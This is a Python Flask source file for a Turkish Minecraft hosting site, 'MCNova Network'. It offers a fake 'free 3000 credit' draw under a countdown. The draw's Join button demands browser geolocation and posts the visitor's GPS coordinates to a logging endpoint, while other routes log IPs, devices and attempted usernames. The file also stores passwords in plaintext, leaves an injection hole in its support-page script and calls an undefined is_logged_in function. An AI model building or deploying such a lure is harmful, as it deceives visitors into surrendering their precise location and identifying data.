from flask import Flask, request, session, redirect, url_for, jsonify, render_template_string
import datetime
import os
import textwrap
import sys

app = Flask(__name__)
app.secret_key = "super-secret-key"

USERS = {}
EVENT_END_TIME = datetime.datetime.now() + datetime.timedelta(hours=24)

# ---------- DÜZELTİLMİŞ YARDIMCI FONKSİYONLAR ----------
def get_client_ip():
    """
    Vercel (ve diğer CDN/Proxy) ortamlarında gerçek client IP'sini bulur.
    Önce X-Forwarded-For (en soldaki IP), sonra X-Real-Ip, en son remote_addr.
    """
    # X-Forwarded-For formatı genellikle: client, proxy1, proxy2
    xff = request.headers.get("X-Forwarded-For")
    if xff:
        ip = xff.split(",")[0].strip()
        if ip:
            return ip
    
    # Vercel bazen X-Real-Ip gönderir
    xri = request.headers.get("X-Real-Ip")
    if xri:
        return xri.strip()
    
    # Son çare (Vercel'de genelde 127.0.0.1 veya internal IP olur)
    return request.remote_addr or "unknown"

def get_user_agent_string():
    """User-Agent header'ını güvenli şekilde alır."""
    return request.headers.get("User-Agent", "Unknown")

def detect_device(ua_string):
    """User-Agent stringinden cihaz tipi tespiti."""
    ua = ua_string.lower()
    if "mobile" in ua or "android" in ua or "iphone" in ua:
        if "ipad" in ua or "tablet" in ua:
            return "Tablet"
        return "Mobile"
    return "PC"

def log_visit(event, details=""):
    """
    Ziyaret bilgilerini konsola basar.
    try/except ile sarmalanmıştır; loglama hatası sayfayı çökertmez.
    """
    try:
        ip = get_client_ip()
        ua = get_user_agent_string()
        device = detect_device(ua)
        ts = datetime.datetime.now().isoformat(timespec="seconds")
        line = f"[{ts}] {event} | IP={ip} | Cihaz={device} | UA={ua[:80]} | {details}"
        print(line, flush=True)  # flush=True Vercel'de logların hemen düşmesini sağlar
    except Exception as e:
        print(f"[LOG_ERROR] {e}", flush=True)

# ---------- LAYOUT ----------
def layout(title, body_html, user=None):
    user_html = ""
    if user:
        user_html = f'<div class="user-info"><span>👤 {user}</span><a href="/logout" class="btn small">Çıkış</a></div>'
    else:
        user_html = '<div class="user-info"><a href="/login" class="btn small">Giriş</a><a href="/register" class="btn small secondary">Kayıt Ol</a></div>'

    return textwrap.dedent(f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>{title}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {{ box-sizing: border-box; margin: 0; padding: 0; }}
            body {{ font-family: Arial, sans-serif; background: #050810; color: #f5f5f5; min-height: 100vh; }}
            a {{ color: inherit; text-decoration: none; }}
            .navbar {{ width: 100%; background: linear-gradient(90deg,#111827,#1f2937); padding: 12px 6%; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #111827; position: sticky; top: 0; z-index: 50; }}
            .logo {{ font-weight:700; font-size:20px; color:#22c55e; }}
            .nav-links a {{ margin:0 10px; font-size:14px; opacity:0.9; }}
            .nav-links a:hover {{ color:#22c55e; }}
            .user-info {{ display:flex; align-items:center; gap:10px; font-size:13px; }}
            .btn {{ background:#22c55e; color:#000; padding:8px 14px; border-radius:999px; font-size:13px; border:none; cursor:pointer; font-weight:600; }}
            .btn.small {{ padding:6px 10px; font-size:12px; }}
            .btn.secondary {{ background:transparent; border:1px solid #22c55e; color:#22c55e; }}
            .btn.secondary:hover {{ background:#22c55e; color:#000; }}
            .container {{ max-width:1100px; margin:30px auto; padding:0 6%; }}
            .grid {{ display:grid; grid-template-columns:repeat(auto-fit, minmax(280px,1fr)); gap:20px; }}
            .card {{ background:radial-gradient(circle at top, #111827, #020617); border-radius:14px; border:1px solid #1f2937; padding:18px 18px 20px; box-shadow:0 10px 30px rgba(0,0,0,0.7); }}
            .card h2, .card h3 {{ margin-bottom:10px; }}
            .badge {{ display:inline-block; padding:4px 10px; border-radius:999px; font-size:11px; background:rgba(34,197,94,0.16); color:#bbf7d0; border:1px solid #22c55e; }}
            .muted {{ color:#9ca3af; font-size:13px; }}
            .hero {{ display:grid; grid-template-columns:minmax(0,2.2fr) minmax(0,2fr); gap:24px; align-items:center; }}
            .hero-img {{ background-image:url('https://images.pexels.com/photos/7770022/pexels-photo-7770022.jpeg'); background-size:cover; background-position:center; border-radius:18px; min-height:220px; box-shadow:0 15px 40px rgba(0,0,0,0.8); position:relative; overflow:hidden; }}
            .hero-img::after {{ content:"Survival • Skyblock • KitPvP"; position:absolute; left:14px; bottom:14px; font-size:12px; padding:6px 10px; border-radius:999px; background:rgba(15,23,42,0.88); border:1px solid rgba(148,163,184,0.7); }}
            .hero-title {{ font-size:26px; margin-bottom:10px; }}
            .hero-sub {{ font-size:14px; color:#e5e7eb; margin-bottom:16px; }}
            .credits-table {{ width:100%; border-collapse:collapse; margin-top:10px; font-size:13px; }}
            .credits-table th, .credits-table td {{ padding:8px; border-bottom:1px solid #1f2937; }}
            .credits-table th {{ text-align:left; font-weight:600; color:#9ca3af; }}
            .credits-table tr:hover {{ background:rgba(15,23,42,0.7); }}
            .event-timer {{ font-family:monospace; margin-top:6px; color:#facc15; }}
            .form-group {{ margin-bottom:10px; }}
            label {{ font-size:13px; display:block; margin-bottom:4px; }}
            input[type="text"], input[type="password"], input[type="email"], textarea {{
                width:100%; padding:8px 10px; border-radius:8px; border:1px solid #374151; background:#020617; color:#e5e7eb; font-size:13px; font-family: inherit;
            }}
            .auth-box {{ max-width:360px; margin:40px auto; }}
            .alert {{ padding:10px 12px; font-size:13px; border-radius:8px; margin-bottom:12px; }}
            .alert.success {{ background:#022c22; color:#6ee7b7; border:1px solid #059669; }}
            .alert.error {{ background:#3f1d1d; color:#fecaca; border:1px solid #b91c1c; }}
            @media (max-width:768px) {{
                .hero {{ grid-template-columns:1fr; }}
                .navbar {{ flex-wrap:wrap; gap:8px; }}
                .nav-links {{ order:3; width:100%; display:flex; justify-content:center; flex-wrap:wrap; margin-top:6px; }}
            }}
        </style>
    </head>
    <body>
        <div class="navbar">
            <div class="logo">MCNova Network</div>
            <div class="nav-links">
                <a href="/">Ana Sayfa</a>
                <a href="/about">Hakkımızda</a>
                <a href="/events">Etkinlikler</a>
                <a href="/kits">Kit Kasa</a>
                <a href="/market">Market</a>
                <a href="/support">Destek</a>
            </div>
            {user_html}
        </div>
        <div class="container">
            {body_html}
        </div>
    </body>
    </html>
    """)

# ---------- SAYFALAR ----------
@app.route("/")
def home():
    user = session.get("user")
    now = datetime.datetime.now()
    left = max(0, int((EVENT_END_TIME - now).total_seconds()))
    body = f"""
    <div class="hero">
        <div>
            <span class="badge">⚔️ YENİ NESİL MINECRAFT SUNUCU PLATFORMU</span>
            <h1 class="hero-title">Sunucunu güçlendir, oyuncularını şaşırt.</h1>
            <p class="hero-sub">
                Nova Network, Türkiye oyuncuları için optimize edilmiş düşük gecikmeli altyapı,
                gelişmiş anti-cheat ve otomatize kredi sistemiyle topluluk sunucularını bir üst seviyeye taşıyor.
            </p>
            <div class="card" style="margin-top:10px;">
                <h3>🎁 Ücretsiz 3000 Kredi Etkinliği</h3>
                <p class="muted">
                    Etkinlik yalnızca yeni sezon lansmanına özel. Şimdi katıl, 3000 kredi kazanma şansı yakala.
                </p>
                <div class="event-timer" id="event-timer" data-left="{left}">
                    Etkinlik süresi hesaplanıyor...
                </div>
                <p style="font-size:12px; color:#9ca3af; margin-top:6px;">
                    • Katıl butonuna bastığında konumunu doğrulayan oyuncular sistem tarafından otomatik kaydedilir.
                </p>
                <button class="btn" style="margin-top:10px;" onclick="joinEventWithLocation()">
                    🎯 Etkinliğe Katıl ve Şansını Kullan
                </button>
                <div id="event-message" class="muted" style="margin-top:8px;"></div>
            </div>
        </div>
        <div class="hero-img"></div>
    </div>

    <div style="margin-top:30px;" class="grid">
        <div class="card">
            <h3>💳 Kredi Paketleri</h3>
            <p class="muted">Sunucuda VIP, Kit, Prefix, Drop ve daha fazlası için esnek kredi sistemi.</p>
            <table class="credits-table">
                <tr><th>Paket</th><th>Fiyat</th><th>Not</th></tr>
                <tr><td>100 Kredi</td><td>200 TL</td><td>Başlangıç için ideal</td></tr>
                <tr><td>500 Kredi</td><td>900 TL</td><td>%10 bonus</td></tr>
                <tr><td>1000 Kredi</td><td>1500 TL</td><td>Sunucu sahiplerinin favorisi</td></tr>
                <tr><td>3000 Kredi</td><td>Kampanya</td><td>Etkinlik ile ücretsiz şans</td></tr>
            </table>
        </div>
        <div class="card">
            <h3>📦 Kit & Kasa Altyapısı</h3>
            <p class="muted">
                Hazır KitPvP, SkyPvP, Factions ve Survival loot tabloları ile oyuncularına
                stabil, adil ve heyecanlı bir ekonomi sun.
            </p>
            <p class="muted" style="margin-top:8px;">
                Tüm kasa açılışları, istatistikler ve kredi harcamaları panel üzerinden detaylı takip edilebilir.
            </p>
        </div>
        <div class="card">
            <h3>🛡️ Güvenli Altyapı</h3>
            <p class="muted">
                Lisanslı anti-bot koruması, TCP shield ve rate-limit yapısı ile saldırılara karşı dayanıklı,
                sürekli erişilebilir bir sunucu deneyimi.
            </p>
        </div>
    </div>

    <script>
    function updateTimer() {{
        var el = document.getElementById('event-timer');
        if (!el) return;
        var left = parseInt(el.getAttribute('data-left'));
        if (isNaN(left) || left <= 0) {{
            el.textContent = "Etkinlik sona erdi.";
            return;
        }}
        function format(sec) {{
            var h = Math.floor(sec / 3600);
            var m = Math.floor((sec % 3600) / 60);
            var s = sec % 60;
            return h.toString().padStart(2,'0') + ":" +
                   m.toString().padStart(2,'0') + ":" +
                   s.toString().padStart(2,'0');
        }}
        el.textContent = "Etkinlik bitişine kalan süre: " + format(left);
        var timer = setInterval(function() {{
            left--;
            if (left <= 0) {{
                el.textContent = "Etkinlik sona erdi.";
                clearInterval(timer);
            }} else {{
                el.textContent = "Etkinlik bitişine kalan süre: " + format(left);
            }}
        }}, 1000);
    }}
    updateTimer();

    function joinEventWithLocation() {{
        var msg = document.getElementById('event-message');
        msg.textContent = "";
        if (!navigator.geolocation) {{
            msg.textContent = "Tarayıcınız konum özelliğini desteklemiyor.";
            return;
        }}
        msg.textContent = "Konum doğrulanıyor, lütfen izin verin...";
        navigator.geolocation.getCurrentPosition(
            function(pos) {{
                var lat = pos.coords.latitude;
                var lon = pos.coords.longitude;
                fetch('/log-location', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{lat: lat, lon: lon}})
                }})
                .then(r => r.json())
                .then(function(res1) {{
                    fetch('/join-event', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{event_id: 'free3000'}})
                    }})
                    .then(r => r.json())
                    .then(function(res2) {{
                        msg.textContent = res2.message || "Etkinlik kaydınız alındı.";
                    }});
                }})
                .catch(function() {{
                    msg.textContent = "Sunucuya bağlanırken hata oluştu.";
                }});
            }},
            function(err) {{
                if (err.code === 1) {{
                    msg.textContent = "Konum izni reddedildi. Etkinliğe katılmak için konumunu doğrulaman gerekiyor.";
                }} else {{
                    msg.textContent = "Konum alınamadı. Daha sonra tekrar deneyin.";
                }}
            }}
        );
    }}
    </script>
    """
    log_visit("ANA_SAYFA", f"Kullanici: {user or 'Ziyaretci'}")
    return layout("MCNova Network - Ana Sayfa", body, user=user)

@app.route("/about")
def about():
    user = session.get("user")
    body = """
    <div class="card">
        <h2>Hakkımızda</h2>
        <p class="muted" style="margin-top:8px;">
            MCNova, 2018’den beri Türkiye ve Avrupa bölgesinde yüzlerce Minecraft topluluk sunucusuna
            altyapı sağlayan bir geliştirici ekibidir.
        </p>
        <p class="muted" style="margin-top:8px;">
            Amacımız; karmaşık panel yapılarını sadeleştirip, sunucu sahiplerinin teknik detaylarla uğraşmadan
            içerik ve oyuncu deneyimine odaklanmasını sağlamaktır.
        </p>
    </div>
    """
    log_visit("HAKKIMIZDA", f"Kullanici: {user or 'Ziyaretci'}")
    return layout("Hakkımızda - MCNova", body, user=user)

@app.route("/events")
def events():
    user = session.get("user")
    now = datetime.datetime.now()
    left = max(0, int((EVENT_END_TIME - now).total_seconds()))
    body = f"""
    <div class="grid">
        <div class="card">
            <span class="badge">AKTİF</span>
            <h3 style="margin-top:8px;">🎁 Ücretsiz 3000 Kredi Çekilişi</h3>
            <p class="muted" style="margin-top:6px;">
                Tüm oyuncular arasından rastgele seçilecek 10 kişiye 3000’er kredi tanımlanır.
                Kazananlar panel üzerinden duyurulur.
            </p>
            <div class="event-timer" data-left="{left}">
                Bitiş: 24 saat içinde
            </div>
            <button class="btn" style="margin-top:10px;" onclick="window.location.href='/'">
                Etkinliğe Git
            </button>
        </div>
        <div class="card">
            <span class="badge" style="background:rgba(148,163,184,0.16);border-color:#9ca3af;color:#e5e7eb;">
                YAKINDA
            </span>
            <h3 style="margin-top:8px;">⚔️ Sezon Açılış Eventleri</h3>
            <p class="muted" style="margin-top:6px;">
                2x drop, özel boss spawner’ları, sınırlı süreli kozmetik eşyalar ve daha fazlası
                yeni sezon lansmanı ile geliyor.
            </p>
        </div>
    </div>
    """
    log_visit("ETKINLIKLER", f"Kullanici: {user or 'Ziyaretci'}")
    return layout("Etkinlikler - MCNova", body, user=user)

@app.route("/kits")
def kits():
    user = session.get("user")
    body = """
    <div class="card">
        <h2>Kit Kasa Sistemi</h2>
        <p class="muted" style="margin-top:8px;">
            SkyPvP, KitPvP ve Survival modları için hazır kasa konfigürasyonları ve animasyonlu açılış ekranları.
            Tüm kitler kredi sistemiyle entegre çalışır.
        </p>
        <p class="muted" style="margin-top:8px;">
            Her kasa açılışında loglama sistemi sayesinde abuse, hile ve exploit durumlarını detaylı şekilde takip edebilirsin.
        </p>
    </div>
    """
    log_visit("KIT_KASA", f"Kullanici: {user or 'Ziyaretci'}")
    return layout("Kit Kasa - MCNova", body, user=user)

@app.route("/market")
def market():
    user = session.get("user")
    body = """
    <div class="card">
        <h2>Market</h2>
        <p class="muted" style="margin-top:8px;">
            Yakında: Paketler, plugin lisansları, temalar ve hazır konfigürasyonları tek panel üzerinden satın alabileceğin
            bir pazar alanı.
        </p>
    </div>
    """
    log_visit("MARKET", f"Kullanici: {user or 'Ziyaretci'}")
    return layout("Market - MCNova", body, user=user)

@app.route("/support")
def support():
    user = session.get("user")
    body = f"""
    <div class="card">
        <h2>Destek Bilet Sistemi</h2>
        <p class="muted" style="margin-top:8px;">
            Herhangi bir sorun, öneri veya teknik destek talebiniz için lütfen aşağıdaki formu doldurun.
            Ekibi 24 saat içinde size dönüş yapacaktır.
        </p>
        <form id="support-form">
            <div class="form-group">
                <label>Konu Başlığı</label>
                <input type="text" name="subject" placeholder="Örnek: Kiralık sunucuda lag sorunu" required>
            </div>
            <div class="form-group">
                <label>Açıklama</label>
                <textarea name="message" rows="5" placeholder="Sorunun ayrıntılarını, adımları ve aldığınız hataları buraya yazın." required></textarea>
            </div>
            <button type="submit" class="btn" style="width:100%; margin-top:10px;">Bilet Gönder</button>
            <div id="support-msg" class="muted" style="margin-top:8px;"></div>
        </form>
    </div>
    <script>
    document.getElementById('support-form').addEventListener('submit', function(e) {{
        e.preventDefault();
        var msg = document.getElementById('support-msg');
        msg.textContent = "Gönderiliyor...";
        var form = e.target;
        var data = {{
            subject: form.subject.value,
            message: form.message.value,
            user: "{user or 'Anonim'}"
        }};
        fetch('/support-submit', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(data)
        }})
        .then(r => r.json())
        .then(function(res) {{
            if (res.success) {{
                msg.textContent = "Biletiniz başarıyla gönderildi. Teşekkür ederiz!";
                form.reset();
            }} else {{
                msg.textContent = "Bir hata oluştu: " + (res.message || '');
            }}
        }})
        .catch(function() {{
            msg.textContent = "Sunucuya bağlanırken hata oluştu.";
        }});
    }});
    </script>
    """
    log_visit("DESTEK_SAYFASI", f"Kullanici: {user or 'Ziyaretci'}")
    return layout("Destek - MCNova", body, user=user)

@app.route("/support-submit", methods=["POST"])
def support_submit():
    if not is_logged_in():
        return jsonify({"success": False, "message": "Destek göndermek için giriş yapman gerekiyor."})
    data = request.get_json() or {}
    subject = data.get("subject", "").strip()
    message = data.get("message", "").strip()
    user = session.get("user")
    log_visit("DESTEK_BILETI", f"Kullanici: {user} | Konu: {subject[:50]} | Uzunluk: {len(message)}")
    return jsonify({"success": True, "message": "Biletiniz alındı, ekibi inceler."})

# ---------- AUTH ----------
@app.route("/login", methods=["GET", "POST"])
def login():
    msg = ""
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        user = USERS.get(username)
        if user and user["password"] == password:
            session["user"] = username
            return redirect(url_for("home"))
        else:
            msg = "Kullanıcı adı veya şifre hatalı."

    body = f"""
    <div class="auth-box card">
        <h2>Giriş Yap</h2>
        <p class="muted" style="margin-top:6px;">Panel özelliklerine erişmek için giriş yap.</p>
        {f'<div class="alert error">{msg}</div>' if msg else ''}
        <form method="post">
            <div class="form-group">
                <label>Kullanıcı Adı</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Şifre</label>
                <input type="password" name="password" required>
            </div>
            <button class="btn" type="submit" style="width:100%; margin-top:4px;">Giriş Yap</button>
        </form>
        <p class="muted" style="margin-top:10px;font-size:12px;">
            Hesabın yok mu? <a href="/register" style="color:#22c55e;">Kayıt ol</a>
        </p>
    </div>
    """
    log_visit("GIRIS_SAYFASI", f"Deneme: {request.form.get('username','')}")
    return layout("Giriş - MCNova", body, user=session.get("user"))

@app.route("/register", methods=["GET", "POST"])
def register():
    msg = ""
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        email = request.form.get("email", "").strip()
        if not username or not password:
            msg = "Lütfen tüm alanları doldurun."
        elif username in USERS:
            msg = "Bu kullanıcı adı zaten kullanılıyor."
        else:
            USERS[username] = {"password": password, "credits": 0, "email": email}
            session["user"] = username
            return redirect(url_for("home"))

    body = f"""
    <div class="auth-box card">
        <h2>Kayıt Ol</h2>
        <p class="muted" style="margin-top:6px;">Panel erişimi için ücretsiz bir hesap oluştur.</p>
        {f'<div class="alert error">{msg}</div>' if msg else ''}
        <form method="post">
            <div class="form-group">
                <label>Kullanıcı Adı</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>E‑posta</label>
                <input type="email" name="email">
            </div>
            <div class="form-group">
                <label>Şifre</label>
                <input type="password" name="password" required>
            </div>
            <button class="btn" type="submit" style="width:100%; margin-top:4px;">Kayıt Ol</button>
        </form>
        <p class="muted" style="margin-top:10px;font-size:12px;">
            Zaten hesabın var mı? <a href="/login" style="color:#22c55e;">Giriş yap</a>
        </p>
    </div>
    """
    log_visit("KAYIT_SAYFASI", f"Deneme: {request.form.get('username','')}")
    return layout("Kayıt Ol - MCNova", body, user=session.get("user"))

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("home"))

# ---------- Event + Konum API ----------
@app.route("/join-event", methods=["POST"])
def join_event():
    if not is_logged_in():
        return jsonify({"success": False, "message": "Etkinliğe katılmak için giriş yapman gerekiyor."})
    data = request.get_json() or {}
    event_id = data.get("event_id")
    now = datetime.datetime.now()
    if now > EVENT_END_TIME:
        return jsonify({"success": False, "message": "Etkinlik süresi doldu."})
    log_visit("ETKINLIK_KATILIM", f"Kullanici: {session.get('user')} | Event: {event_id}")
    return jsonify({"success": True, "message": "Çekilişe katılımın onaylandı. Sonuçlar etkinlik bitiminde açıklanacaktır."})

@app.route("/log-location", methods=["POST"])
def log_location():
    if not is_logged_in():
        return jsonify({"success": False, "message": "Oturum bulunamadı."})
    data = request.get_json() or {}
    lat = data.get("lat")
    lon = data.get("lon")
    ip = get_client_ip()
    ua = get_user_agent_string()
    device = detect_device(ua)
    log_visit("GPS_KONUM", f"Kullanici: {session.get('user')} | IP={ip} | Cihaz={device} | Lat={lat} | Lon={lon}")
    return jsonify({"success": True, "message": "Konum kaydedildi."})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
